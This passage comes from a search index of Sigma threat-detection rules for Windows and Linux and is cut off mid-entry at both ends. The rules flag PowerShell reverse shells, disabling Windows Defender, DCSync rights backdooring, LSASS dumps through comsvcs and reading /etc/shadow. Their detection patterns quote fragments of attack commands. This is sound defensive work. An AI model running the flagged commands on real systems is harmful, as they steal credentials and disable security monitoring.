attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;new-object system.net.sockets.tcpclient\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative might use this function for checking network connectivity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_reverse_shell_connection.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Powershell Reverse Shell Connection"},{"categories":null,"contents":"Detects powershell script installed as a Service\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: PowerShell Scripts Installed as Services id: a2e5019d-a658-4c6a-92bf-7197b54e2cae description: Detects powershell script installed as a Service status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/11/30 references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse tags: - attack.execution - attack.t1569.002 logsource: product: windows service: system detection: service_creation: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains: - \u0026#39;powershell\u0026#39; - \u0026#39;pwsh\u0026#39; condition: service_creation falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_powershell_script_installed_as_service.yml/","tags":["attack.execution","attack.t1569.002"],"title":"PowerShell Scripts Installed as Services"},{"categories":null,"contents":"Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md Raw rule (edit) title: Powershell Store File In Alternate Data Stream id: a699b30e-d010-46c8-bbd1-ee2e26765fe9 status: experimental author: frack113 date: 2021/09/02 modified: 2021/10/16 description: Storing files in Alternate Data Stream (ADS) similar to Astaroth malware. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md tags: - attack.defense_evasion - attack.t1564.004 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_compspec: ScriptBlockText|contains|all: - \u0026#39;Start-Process\u0026#39; - \u0026#39;-FilePath \u0026#34;$env:comspec\u0026#34; \u0026#39; - \u0026#39;-ArgumentList \u0026#39; - \u0026#39;\u0026gt;\u0026#39; condition: selection_compspec falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_store_file_in_alternate_data_stream.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Powershell Store File In Alternate Data Stream"},{"categories":null,"contents":"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder.\nKnown false-positives legitime admin script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md https://www.offensive-security.com/metasploit-unleashed/timestomp/ Raw rule (edit) title: Powershell Timestomp id: c6438007-e081-42ce-9483-b067fbef33c3 status: experimental author: frack113 date: 2021/08/03 modified: 2021/10/16 description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md - https://www.offensive-security.com/metasploit-unleashed/timestomp/ tags: - attack.defense_evasion - attack.t1070.006 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_ioc: ScriptBlockText|contains: - \u0026#39;.CreationTime =\u0026#39; - \u0026#39;.LastWriteTime =\u0026#39; - \u0026#39;.LastAccessTime =\u0026#39; - \u0026#39;[IO.File]::SetCreationTime\u0026#39; - \u0026#39;[IO.File]::SetLastAccessTime\u0026#39; - \u0026#39;[IO.File]::SetLastWriteTime\u0026#39; condition: selection_ioc falsepositives: - legitime admin script level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_timestomp.yml/","tags":["attack.defense_evasion","attack.t1070.006"],"title":"Powershell Timestomp"},{"categories":null,"contents":"Detects attackers attempting to disable Windows Defender using Powershell\nKnown false-positives Minimal, for some older versions of dev tools, such as pycharm, developers were known to sometimes disable Windows Defender to improve performance, but this generally is not considered a good security practice. References https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/ https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Powershell Used To Disable Windows Defender AV Security Monitoring id: a7ee1722-c3c5-aeff-3212-c777e4733217 status: experimental description: Detects attackers attempting to disable Windows Defender using Powershell author: \u0026#39;ok @securonix invrep-de, oscd.community, frack113\u0026#39; date: 2020/10/12 modified: 2021/06/07 references: - https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/ - https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;-DisableBehaviorMonitoring $true\u0026#39; - \u0026#39;-DisableRuntimeMonitoring $true\u0026#39; selection_tamper_cmd_stop: CommandLine|contains|all: - sc - stop - WinDefend selection_tamper_cmd_disabled: CommandLine|contains|all: - sc - config - WinDefend - \u0026#39;start=disabled\u0026#39; condition: 1 of selection* falsepositives: - \u0026#39;Minimal, for some older versions of dev tools, such as pycharm, developers were known to sometimes disable Windows Defender to improve performance, but this generally is not considered a good security practice.\u0026#39; level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_disable_windef_av.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Powershell Used To Disable Windows Defender AV Security Monitoring"},{"categories":null,"contents":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-8---powershell-xml-requests Raw rule (edit) title: Powershell XML Execute Command id: 6c6c6282-7671-4fe9-a0ce-a2dcebdc342b status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code author: frack113 date: 2022/01/19 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-8---powershell-xml-requests logsource: product: windows category: ps_script detection: selection_xml: ScriptBlockText|contains|all: - New-Object - System.Xml.XmlDocument - .Load selection_exec: - IEX - Invoke-Expression condition: all of selection_* falsepositives: - legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_xml_iex.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Powershell XML Execute Command"},{"categories":null,"contents":"backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\\Add-DomainObjectAcl DCSync Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer\nKnown false-positives New Domain Controller computer account, check user SIDs within the value attribute of event 5136 and verify if it\u0026rsquo;s a regular user or DC computer account. References https://twitter.com/menasec1/status/1111556090137903104 https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf Raw rule (edit) title: Powerview Add-DomainObjectAcl DCSync AD Extend Right id: 2c99737c-585d-4431-b61a-c911d86ff32f description: backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\\Add-DomainObjectAcl DCSync Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer status: experimental date: 2019/04/03 modified: 2021/07/09 author: Samir Bousseaden; Roberto Rodriguez @Cyb3rWard0g; oscd.community references: - https://twitter.com/menasec1/status/1111556090137903104 - https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 5136 AttributeLDAPDisplayName: \u0026#39;ntSecurityDescriptor\u0026#39; AttributeValue|contains: - \u0026#39;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\u0026#39; - \u0026#39;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\u0026#39; - \u0026#39;89e95b76-444d-4c62-991a-0facbeda640c\u0026#39; condition: selection falsepositives: - New Domain Controller computer account, check user SIDs within the value attribute of event 5136 and verify if it\u0026#39;s a regular user or DC computer account. level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_account_backdoor_dcsync_rights.yml/","tags":["attack.persistence","attack.t1098"],"title":"Powerview Add-DomainObjectAcl DCSync AD Extend Right"},{"categories":null,"contents":"Detects static QMS 810 and mimikatz driver name used by Mimikatz as exploited in CVE-2021-1675 and CVE-2021-34527\nKnown false-positives Legitimate installation of printer driver QMS 810, Texas Instruments microLaser printer (unlikely) References https://github.com/gentilkiwi/mimikatz/commit/c21276072b3f2a47a21e215a46962a17d54b3760 https://www.lexjansen.com/sesug/1993/SESUG93035.pdf https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913 Raw rule (edit) title: PrinterNightmare Mimimkatz Driver Name id: ba6b9e43-1d45-4d3c-a504-1043a64c8469 status: experimental description: Detects static QMS 810 and mimikatz driver name used by Mimikatz as exploited in CVE-2021-1675 and CVE-2021-34527 references: - https://github.com/gentilkiwi/mimikatz/commit/c21276072b3f2a47a21e215a46962a17d54b3760 - https://www.lexjansen.com/sesug/1993/SESUG93035.pdf - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913 author: Markus Neis, @markus_neis, Florian Roth tags: - attack.execution - attack.t1204 - cve.2021.1675 - cve.2021.34527 date: 2021/07/04 modified: 2021/07/28 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: - \u0026#39;\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\QMS 810\\\u0026#39; - \u0026#39;\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\mimikatz\u0026#39; selection_alt: TargetObject|contains|all: - \u0026#39;legitprinter\u0026#39; - \u0026#39;\\Control\\Print\\Environments\\Windows\u0026#39; selection_print: TargetObject|contains: - \u0026#39;\\Control\\Print\\Environments\u0026#39; - \u0026#39;\\CurrentVersion\\Print\\Printers\u0026#39; selection_kiwi: TargetObject|contains: - \u0026#39;Gentil Kiwi\u0026#39; - \u0026#39;mimikatz printer\u0026#39; - \u0026#39;Kiwi Legit Printer\u0026#39; condition: selection or selection_alt or (selection_print and selection_kiwi) falsepositives: - Legitimate installation of printer driver QMS 810, Texas Instruments microLaser printer (unlikely) level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_mimikatz_printernightmare.yml/","tags":["attack.execution","attack.t1204","cve.2021.1675","cve.2021.34527"],"title":"PrinterNightmare Mimimkatz Driver Name"},{"categories":null,"contents":"Detects suspicious shell commands indicating the information gathering phase as preparation for the Privilege Escalation.\nKnown false-positives Troubleshooting on Linux Machines References https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://patrick-bareiss.com/detect-privilege-escalation-preparation-in-linux-with-sigma/ Raw rule (edit) title: Privilege Escalation Preparation id: 444ade84-c362-4260-b1f3-e45e20e1a905 status: test description: Detects suspicious shell commands indicating the information gathering phase as preparation for the Privilege Escalation. author: Patrick Bareiss references: - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ - https://patrick-bareiss.com/detect-privilege-escalation-preparation-in-linux-with-sigma/ date: 2019/04/05 modified: 2021/11/27 logsource: product: linux detection: keywords: # distribution type and kernel version - \u0026#39;cat /etc/issue\u0026#39; - \u0026#39;cat /etc/*-release\u0026#39; - \u0026#39;cat /proc/version\u0026#39; - \u0026#39;uname -a\u0026#39; - \u0026#39;uname -mrs\u0026#39; - \u0026#39;rpm -q kernel\u0026#39; - \u0026#39;dmesg | grep Linux\u0026#39; - \u0026#39;ls /boot | grep vmlinuz-\u0026#39; # environment variables - \u0026#39;cat /etc/profile\u0026#39; - \u0026#39;cat /etc/bashrc\u0026#39; - \u0026#39;cat ~/.bash_profile\u0026#39; - \u0026#39;cat ~/.bashrc\u0026#39; - \u0026#39;cat ~/.bash_logout\u0026#39; # applications and services as root - \u0026#39;ps -aux | grep root\u0026#39; - \u0026#39;ps -ef | grep root\u0026#39; # scheduled tasks - \u0026#39;crontab -l\u0026#39; - \u0026#39;cat /etc/cron*\u0026#39; - \u0026#39;cat /etc/cron.allow\u0026#39; - \u0026#39;cat /etc/cron.deny\u0026#39; - \u0026#39;cat /etc/crontab\u0026#39; # search for plain text user/passwords - \u0026#39;grep -i user *\u0026#39; - \u0026#39;grep -i pass *\u0026#39; # networking - \u0026#39;ifconfig\u0026#39; - \u0026#39;cat /etc/network/interfaces\u0026#39; - \u0026#39;cat /etc/sysconfig/network\u0026#39; - \u0026#39;cat /etc/resolv.conf\u0026#39; - \u0026#39;cat /etc/networks\u0026#39; - \u0026#39;iptables -L\u0026#39; - \u0026#39;lsof -i\u0026#39; - \u0026#39;netstat -antup\u0026#39; - \u0026#39;netstat -antpx\u0026#39; - \u0026#39;netstat -tulpn\u0026#39; - \u0026#39;arp -e\u0026#39; - \u0026#39;route\u0026#39; # sensitive files - \u0026#39;cat /etc/passwd\u0026#39; - \u0026#39;cat /etc/group\u0026#39; - \u0026#39;cat /etc/shadow\u0026#39; # sticky bits - \u0026#39;find / -perm -u=s\u0026#39; - \u0026#39;find / -perm -g=s\u0026#39; - \u0026#39;find / -perm -4000\u0026#39; - \u0026#39;find / -perm -2000\u0026#39; timeframe: 30m condition: keywords | count() by host \u0026gt; 6 falsepositives: - Troubleshooting on Linux Machines level: medium tags: - attack.execution - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shell_priv_esc_prep.yml/","tags":["attack.execution","attack.t1059.004"],"title":"Privilege Escalation Preparation"},{"categories":null,"contents":"Detects process discovery commands\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md Raw rule (edit) title: Process Discovery id: 4e2f5868-08d4-413d-899f-dc2f1508627b status: stable description: Detects process discovery commands author: Ömer Günal, oscd.community date: 2020/10/06 modified: 2021/08/14 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/ps\u0026#39; - \u0026#39;/top\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1057 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_process_discovery.yml/","tags":["attack.discovery","attack.t1057"],"title":"Process Discovery"},{"categories":null,"contents":"Detects process memory dump via comsvcs.dll and rundll32\nKnown false-positives unknown References https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ https://twitter.com/SBousseaden/status/1167417096374050817 Raw rule (edit) title: Process Dump via Comsvcs DLL id: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c status: test description: Detects process memory dump via comsvcs.dll and rundll32 author: Modexp (idea) references: - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ - https://twitter.com/SBousseaden/status/1167417096374050817 date: 2019/09/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: rundll_image: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; rundll_ofn: OriginalFileName: \u0026#39;RUNDLL32.EXE\u0026#39; selection: CommandLine|contains|all: - \u0026#39;comsvcs\u0026#39; - \u0026#39;MiniDump\u0026#39; #Matches MiniDump and MinidumpW - \u0026#39;full\u0026#39; condition: (rundll_image or rundll_ofn) and selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1218.011 - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_comsvcs_procdump.yml/","tags":["attack.defense_evasion","attack.t1218.011","attack.credential_access","attack.t1003.001"],"title":"Process Dump via Comsvcs DLL"},{"categories":null,"contents":"Potential adversaries accessing the microphone and webcam in an endpoint.\nKnown false-positives Unknown References https://twitter.com/duzvik/status/1269671601852813320 https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072 Raw rule (edit) title: Processes Accessing the Microphone and Webcam id: 8cd538a4-62d5-4e83-810b-12d41e428d6e status: test description: Potential adversaries accessing the microphone and webcam in an endpoint. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/duzvik/status/1269671601852813320 - https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072 date: 2020/06/07 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4657 - 4656 - 4663 ObjectName|contains: - \u0026#39;\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1123 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_camera_microphone_access.yml/","tags":["attack.collection","attack.t1123"],"title":"Processes Accessing the Microphone and Webcam"},{"categories":null,"contents":"Detects a ProcessHacker tool that elevated privileges to a very high level\nKnown false-positives Unlikely References https://twitter.com/1kwpeter/status/1397816101455765504 Raw rule (edit) title: ProcessHacker Privilege Elevation id: c4ff1eac-84ad-44dd-a6fb-d56a92fc43a9 description: Detects a ProcessHacker tool that elevated privileges to a very high level status: experimental references: - https://twitter.com/1kwpeter/status/1397816101455765504 author: Florian Roth date: 2021/05/27 modified: 2021/11/30 tags: - attack.execution - attack.privilege_escalation - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName|startswith: \u0026#39;ProcessHacker\u0026#39; AccountName: \u0026#39;LocalSystem\u0026#39; condition: selection falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_susp_proceshacker.yml/","tags":["attack.execution","attack.privilege_escalation","attack.t1543.003","attack.t1569.002"],"title":"ProcessHacker Privilege Elevation"},{"categories":null,"contents":"Attackers can use explorer.exe for evading defense mechanisms\nKnown false-positives Legitimate explorer.exe run from cmd.exe References https://twitter.com/CyberRaiju/status/1273597319322058752 Raw rule (edit) title: Proxy Execution Via Explorer.exe id: 9eb271b9-24ae-4cd4-9465-19cfc1047f3e status: test description: Attackers can use explorer.exe for evading defense mechanisms author: \u0026#39;Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative\u0026#39; references: - https://twitter.com/CyberRaiju/status/1273597319322058752 date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \\explorer.exe ParentImage|endswith: - \\cmd.exe CommandLine|contains: - explorer.exe condition: selection falsepositives: - Legitimate explorer.exe run from cmd.exe level: low tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_explorer.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Proxy Execution Via Explorer.exe"},{"categories":null,"contents":"Detecting use PsExec via Pipe Creation/Access to pipes\nKnown false-positives Legitimate Administrator activity References https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view Raw rule (edit) title: PsExec Pipes Artifacts id: 9e77ed63-2ecf-4c7b-b09d-640834882028 status: test description: Detecting use PsExec via Pipe Creation/Access to pipes author: Nikita Nazarov, oscd.community references: - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view date: 2020/05/10 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: PipeName|startswith: - \u0026#39;psexec\u0026#39; - \u0026#39;paexec\u0026#39; - \u0026#39;remcom\u0026#39; - \u0026#39;csexec\u0026#39; condition: selection falsepositives: - Legitimate Administrator activity level: medium tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_psexec_pipes_artifacts.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"PsExec Pipes Artifacts"},{"categories":null,"contents":"Detects suspicious flags used by PsExec and PAExec but no usual program name in command line\nKnown false-positives Weird admins that rename their tools Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing References https://docs.microsoft.com/en-us/sysinternals/downloads/psexec https://www.poweradmin.com/paexec/ https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html Raw rule (edit) title: PsExec/PAExec Flags id: 207b0396-3689-42d9-8399-4222658efc99 status: experimental description: Detects suspicious flags used by PsExec and PAExec but no usual program name in command line references: - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec - https://www.poweradmin.com/paexec/ - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html author: Florian Roth date: 2021/05/22 modified: 2021/11/23 logsource: category: process_creation product: windows detection: selection_flags_1: # Escalation to LOCAL_SYSTEM CommandLine|endswith: - \u0026#39; -s cmd.exe\u0026#39; - \u0026#39; -s -i cmd.exe\u0026#39; selection_flags_2: CommandLine|contains|all: # Accepting EULA in commandline - often used in automated attacks - \u0026#39;accepteula\u0026#39; - \u0026#39; -u \u0026#39; - \u0026#39; -p \u0026#39; - \u0026#39; \\\\\u0026#39; filter: CommandLine|contains: - \u0026#39;paexec\u0026#39; - \u0026#39;PsExec\u0026#39; condition: ( selection_flags_1 or selection_flags_2 ) and not filter falsepositives: - Weird admins that rename their tools - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing level: high tags: - attack.develop_capabilities - attack.t1587.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_psexex_paexec_flags.yml/","tags":["attack.develop_capabilities","attack.t1587.001"],"title":"PsExec/PAExec Flags"},{"categories":null,"contents":"Detects the execution of the PurpleSharp adversary simulation tool\nKnown false-positives Unlikely References https://github.com/mvelazc0/PurpleSharp Raw rule (edit) title: PurpleSharp Indicator id: ff23ffbc-3378-435e-992f-0624dcf93ab4 status: experimental description: Detects the execution of the PurpleSharp adversary simulation tool author: Florian Roth date: 2021/06/18 modified: 2022/01/12 references: - https://github.com/mvelazc0/PurpleSharp logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - xyz123456.exe - PurpleSharp selection2: OriginalFileName: \u0026#39;PurpleSharp.exe\u0026#39; condition: selection1 or selection2 falsepositives: - Unlikely level: critical tags: - attack.t1587 - attack.resource_development ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_purplesharp_indicators.yml/","tags":["attack.t1587","attack.resource_development"],"title":"PurpleSharp Indicator"},{"categories":null,"contents":"Detects QBot like process executions\nKnown false-positives Unlikely References https://twitter.com/killamjr/status/1179034907932315648 https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/ Raw rule (edit) title: QBot Process Creation id: 4fcac6eb-0287-4090-8eea-2602e4c20040 status: experimental description: Detects QBot like process executions author: Florian Roth date: 2019/10/01 modified: 2021/01/25 tags: - attack.execution - attack.t1059.005 references: - https://twitter.com/killamjr/status/1179034907932315648 - https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/ logsource: category: process_creation product: windows detection: selection1: ParentImage|endswith: \u0026#39;\\WinRAR.exe\u0026#39; Image|endswith: \u0026#39;\\wscript.exe\u0026#39; selection2: CommandLine|contains: \u0026#39; /c ping.exe -n 6 127.0.0.1 \u0026amp; type \u0026#39; selection3: CommandLine|contains|all: - \u0026#39;regsvr32.exe\u0026#39; - \u0026#39;C:\\ProgramData\u0026#39; - \u0026#39;.tmp\u0026#39; condition: selection1 or selection2 or selection3 fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_qbot.yml/","tags":["attack.execution","attack.t1059.005"],"title":"QBot Process Creation"},{"categories":null,"contents":"Detects QuarksPwDump clearing access history in hive\nKnown false-positives Unknown Raw rule (edit) title: QuarksPwDump Clearing Access History id: 39f919f3-980b-4e6f-a975-8af7e507ef2b status: test description: Detects QuarksPwDump clearing access history in hive author: Florian Roth date: 2017/05/15 modified: 2021/11/27 logsource: product: windows service: system detection: selection: EventID: 16 HiveName|contains: \u0026#39;\\AppData\\Local\\Temp\\SAM\u0026#39; HiveName|endswith: \u0026#39;.dmp\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_quarkspwdump_clearing_hive_access_history.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"QuarksPwDump Clearing Access History"},{"categories":null,"contents":"Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nKnown false-positives Legitimate deinstallation by administrative staff References https://github.com/Neo23x0/Raccine Raw rule (edit) title: Raccine Uninstall id: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc status: experimental description: Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool. references: - https://github.com/Neo23x0/Raccine tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2021/01/21 modified: 2021/07/14 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;taskkill \u0026#39; - \u0026#39;RaccineSettings.exe\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;reg.exe\u0026#39; - \u0026#39;delete\u0026#39; - \u0026#39;Raccine Tray\u0026#39; selection3: CommandLine|contains|all: - \u0026#39;schtasks\u0026#39; - \u0026#39;/DELETE\u0026#39; - \u0026#39;Raccine Rules Updater\u0026#39; condition: 1 of selection* falsepositives: - Legitimate deinstallation by administrative staff level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_disable_raccine.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Raccine Uninstall"},{"categories":null,"contents":"Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\nKnown false-positives Legitimate use of Winrar command line version Other command line tools, that use these flags References https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/ https://ss64.com/bash/rar.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md Raw rule (edit) title: Rar with Password or Compression Level id: faa48cae-6b25-4f00-a094-08947fef582f status: experimental description: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions. references: - https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/ - https://ss64.com/bash/rar.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md author: \u0026#39;@ROxPinTeddy\u0026#39; date: 2020/05/12 modified: 2021/07/27 tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_password: CommandLine|contains: - \u0026#39; -hp\u0026#39; selection_other: CommandLine|contains: - \u0026#39; -m\u0026#39; - \u0026#39; a \u0026#39; condition: selection_password and selection_other falsepositives: - Legitimate use of Winrar command line version - Other command line tools, that use these flags level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rar_flags.yml/","tags":["attack.collection","attack.t1560.001"],"title":"Rar with Password or Compression Level"},{"categories":null,"contents":"Raw disk access using illegitimate tools, possible defence evasion\nKnown false-positives Legitimate Administrator using tool for raw access or ongoing forensic investigation References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Raw Disk Access Using Illegitimate Tools id: db809f10-56ce-4420-8c86-d6a7d793c79c description: Raw disk access using illegitimate tools, possible defence evasion author: Teymur Kheirkhabarov, oscd.community status: test date: 2019/10/22 modified: 2022/02/21 references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment tags: - attack.defense_evasion - attack.t1006 logsource: product: windows category: raw_access_thread detection: filter_1: Device|contains: floppy filter_2: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SystemApps\\\u0026#39; - 